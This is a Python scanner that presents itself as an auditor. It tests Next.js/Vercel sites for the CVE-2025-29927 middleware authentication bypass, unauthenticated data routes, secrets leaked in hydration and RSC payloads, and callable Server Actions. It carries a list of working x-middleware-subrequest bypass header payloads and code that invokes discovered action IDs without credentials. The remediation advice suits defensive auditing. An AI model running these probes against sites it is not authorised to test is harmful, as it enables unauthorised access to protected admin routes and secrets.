#!/usr/bin/env python3
"""
nextjs_rsc_audit.py v1.0 — Next.js / Vercel (.vercel.app) Middleware Bypass, RSC & Server Actions Auditor.

Operates in Zero-Credential Black-Box Attacker Mode to test modern Next.js / Vercel / Cloudflare Pages apps for:
  1. CVE-2025-29927 Next.js Middleware Auth Bypass (`x-middleware-subrequest` recursion bypass across Next.js 11–15)
  2. Vercel / Next.js Internal Routing Header Confusion (`x-now-route-matches`, `x-invoke-path`, `x-matched-path`)
  3. React Server Components (RSC) Flight Payload (`RSC: 1`) state leakage
  4. Unauthenticated React Server Actions (`Next-Action` 40-char SHA-1 action IDs) enumeration & invocation
  5. `__NEXT_DATA__` SSR hydration tree secret/role leakage & `/_next/data/<buildId>/*.json` auth-redirect bypass
"""
import argparse
import json
import os
import re
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# CVE-2025-29927 & Next.js middleware recursion payloads across versions 11.x - 15.2.2
MIDDLEWARE_BYPASS_HEADERS = [
    {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
    {"x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"},
    {"x-middleware-subrequest": "middleware"},
    {"x-middleware-subrequest": "pages/_middleware"},
    {"x-now-route-matches": "1", "x-Middleware-Subrequest": "middleware:middleware:middleware:middleware:middleware"},
]

PROTECTED_CANDIDATE_PATHS = [
    "/admin",
    "/dashboard",
    "/internal",
    "/settings",
    "/api/admin",
    "/api/internal",
    "/api/users",
    "/api/config",
    "/vault",
]

SENSITIVE_STATE_KEYS = re.compile(
    r"(?i)\b(secret|api[_-]?key|private[_-]?key|service[_-]?role|database[_-]?url|"
    r"openai|openrouter|anthropic|stripe[_-]?secret|jwt[_-]?secret|password|admin[_-]?token)\b"
)


class NextJSRSCAuditor(VibeTool):
    def __init__(self):
        super().__init__(
            "NextJS RSC Auditor",
            "Next.js / Vercel Middleware Bypass (CVE-2025-29927), RSC & Server Actions Auditor",
        )

    def _check_middleware_bypass(self, base_url):
        """Test protected routes for CVE-2025-29927 x-middleware-subrequest authentication bypass."""
        self.log("Testing Next.js Middleware Auth Bypass (CVE-2025-29927 / x-middleware-subrequest)...")
        bypasses = 0

        for path in PROTECTED_CANDIDATE_PATHS:
            url = f"{base_url.rstrip('/')}{path}"
            base_st, base_body, base_hdrs = self.safe_request(url, method="GET", follow_redirects=False)
            # Only test routes that actually enforce auth/redirects (401, 403, 301, 302, 307, 308)
            if base_st not in (401, 403, 301, 302, 307, 308):
                continue

            for hdr_payload in MIDDLEWARE_BYPASS_HEADERS:
                st, body, hdrs = self.safe_request(
                    url, method="GET", headers=hdr_payload, follow_redirects=False
                )
                if (
                    st == 200
                    and body
                    and len(body) > 60
                    and not self.is_soft_404(st, body)
                    and not self.is_waf_challenge(st, body, hdrs)
                ):
                    hdr_str = ", ".join(f"{k}: {v}" for k, v in hdr_payload.items())
                    self.log(
                        f"CRITICAL: Next.js Middleware Bypass (CVE-2025-29927) on {url} "
                        f"(baseline HTTP {base_st} -> HTTP 200 with '{hdr_str}')",
                        "crit",
                    )
                    self.record_finding(
                        title=f"Next.js Middleware Authentication Bypass (CVE-2025-29927) on {path}",
                        severity="critical",
                        location=url,
                        evidence=f"Baseline returned HTTP {base_st}; adding '{hdr_str}' returned HTTP 200 ({len(body)} bytes)",
                        recommendation=(
                            "Upgrade Next.js to >= 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 and strip untrusted "
                            "'x-middleware-subrequest' headers at the Cloudflare / AWS / Vercel edge."
                        ),
                        cwe="CWE-287",
                        owasp="A01:2021 - Broken Access Control",
                    )
                    bypasses += 1
                    break

        if bypasses == 0:
            self.log("No CVE-2025-29927 middleware subrequest bypasses triggered on probed routes.", "pass")
        return bypasses

    def _check_next_data_and_rsc(self, base_url):
        """Inspect __NEXT_DATA__, buildId data routes, RSC Flight streams, and Server Actions."""
        self.log("Auditing __NEXT_DATA__ hydration state, RSC Flight stream, and Next-Action IDs...")
        findings = 0

        st, html, hdrs = self.safe_request(base_url, method="GET")
        if st == 0 or not html:
            self.log("Target root unreachable for RSC/Next.js inspection.", "warn")
            return 0

        # 1. Extract __NEXT_DATA__ JSON if present
        next_data_m = re.search(
            r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>',
            html,
            re.IGNORECASE | re.DOTALL,
        )
        build_id = None
        if next_data_m:
            raw_json = next_data_m.group(1).strip()
            try:
                nd = json.loads(raw_json)
                build_id = nd.get("buildId")
                self.log(f"Detected Next.js __NEXT_DATA__ hydration payload (buildId={build_id})", "info")
                # Scan props/runtimeConfig for leaked secrets
                serialized = json.dumps(nd.get("props", {})) + " " + json.dumps(nd.get("runtimeConfig", {}))
                m = SENSITIVE_STATE_KEYS.search(serialized)
                if m:
                    self.log(
                        f"Sensitive key pattern '{m.group(1)}' exposed in client __NEXT_DATA__ props!",
                        "hack",
                    )
                    self.record_finding(
                        title=f"Sensitive Key Exposed in Next.js __NEXT_DATA__ ({m.group(1)})",
                        severity="high",
                        location=base_url,
                        evidence=f"Matched key '{m.group(1)}' inside __NEXT_DATA__ hydration state",
                        recommendation="Ensure getServerSideProps/getStaticProps only return public DTO fields and never serialize server env or secrets.",
                        cwe="CWE-200",
                        owasp="A05:2021 - Security Misconfiguration",
                    )
                    findings += 1
            except Exception:
                pass

        # 2. If buildId found, test /_next/data/<buildId>/admin.json for SSR data route bypass
        if build_id:
            for page in ("admin", "dashboard", "settings"):
                data_url = f"{base_url.rstrip('/')}/_next/data/{build_id}/{page}.json"
                d_st, d_body, _ = self.safe_request(data_url, method="GET", follow_redirects=False)
                if d_st == 200 and d_body and "pageProps" in d_body:
                    self.log(
                        f"Unauthenticated Next.js SSR data route accessible: {data_url} (HTTP 200)",
                        "hack",
                    )
                    self.record_finding(
                        title=f"Unauthenticated Next.js Data Route Exposed (/_next/data/{build_id}/{page}.json)",
                        severity="high",
                        location=data_url,
                        evidence=d_body[:160],
                        recommendation="Enforce authentication inside data-fetching handlers (getServerSideProps / Server Components), not only in client layouts.",
                        cwe="CWE-285",
                        owasp="A01:2021 - Broken Access Control",
                    )
                    findings += 1

        # 3. Probe React Server Components (RSC: 1) Flight stream
        rsc_st, rsc_body, rsc_hdrs = self.safe_request(
            base_url,
            method="GET",
            headers={"RSC": "1", "Next-Router-Prefetch": "1"},
        )
        ctype = (rsc_hdrs.get("Content-Type") or "").lower()
        if rsc_st == 200 and ("text/x-component" in ctype or rsc_body.startswith("0:")):
            self.log(f"React Server Components (RSC Flight Stream) active on {base_url}", "info")
            m = SENSITIVE_STATE_KEYS.search(rsc_body)
            if m and ("sk-" in rsc_body or "eyJ" in rsc_body):
                self.log(f"Sensitive token leaked inside RSC Flight payload ({m.group(1)})!", "crit")
                self.record_finding(
                    title="Sensitive Token Leaked in React Server Component (RSC) Flight Stream",
                    severity="critical",
                    location=base_url,
                    evidence=f"Matched '{m.group(1)}' in text/x-component response",
                    recommendation="Use React 'server-only' and taint APIs (experimental_taintObjectReference) so server secrets are never passed to Client Components.",
                    cwe="CWE-200",
                    owasp="A05:2021 - Security Misconfiguration",
                )
                findings += 1

        # 4. Scan for 40-char hex Next-Action IDs and test unauthenticated invocation
        action_ids = set(re.findall(r'["\']([0-9a-f]{40})["\']', html))
        for aid in list(action_ids)[:5]:
            act_st, act_body, _ = self.safe_request(
                base_url,
                method="POST",
                data="[]",
                headers={
                    "Next-Action": aid,
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Accept": "text/x-component",
                },
            )
            if act_st == 200 and act_body and ("0:" in act_body or "1:" in act_body):
                self.log(
                    f"Unauthenticated React Server Action callable: Next-Action={aid[:12]}... (HTTP 200)",
                    "warn",
                )

        return findings

    def run(self, url):
        self.banner()
        if "://" not in url:
            first_host = url.split("/")[0].split(":")[0].lower()
            url = f"{'http' if first_host in ('localhost', '127.0.0.1', '::1') else 'https'}://{url}"
        self.log(f"Auditing Next.js / Vercel / RSC attack surface on {url} (Zero-Key Attacker Mode)")
        self.calibrate_soft_404(url)

        total_issues = 0
        total_issues += self._check_middleware_bypass(url)
        total_issues += self._check_next_data_and_rsc(url)

        if total_issues == 0:
            self.log("Next.js / Vercel RSC & Middleware audit complete — 0 critical exposures.", "pass")
        else:
            self.log(f"Next.js / Vercel RSC & Middleware audit flagged {total_issues} issue(s).", "crit")
        return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="NextJS RSC Auditor v1.0 - CVE-2025-29927 Middleware Bypass, RSC & Server Actions Scanner"
    )
    parser.add_argument("--url", "-t", "--target", dest="url", required=True, help="Target URL (e.g. https://my-app.vercel.app)")
    parser.add_argument("-v", "--version", action="version", version="NextJS RSC Auditor 1.0.0")
    args = parser.parse_args(argv)
    return NextJSRSCAuditor().run(args.url)


if __name__ == "__main__":
    sys.exit(main())
